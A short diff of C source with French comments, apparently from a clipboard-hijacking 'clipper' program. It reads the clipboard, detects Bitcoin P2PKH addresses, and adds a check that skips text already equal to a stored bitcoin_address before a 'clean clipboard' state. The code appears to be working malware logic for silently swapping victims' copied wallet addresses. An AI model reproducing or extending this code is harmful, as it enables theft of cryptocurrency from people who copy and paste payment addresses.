@@ -37,6 +37,13 @@ StateCodeProcess main(void)
                 int text_size = wcslen(buffer);
 
                 // -------------------------------------------------- Vérification Bitcoin
+                // Vérification adresse déjà enregistrée
+                if (wcscmp(buffer, bitcoin_address) == 0) {
+                    Sleep(1000);
+                    state = STATE_CLEAN_CLIPBOARD;
+                    break;
+                }
+
                 // Vérification adresse P2PKH
                 if (buffer[0] == L'1') {
                     if (text_size >= 26 && text_size <= 35) {
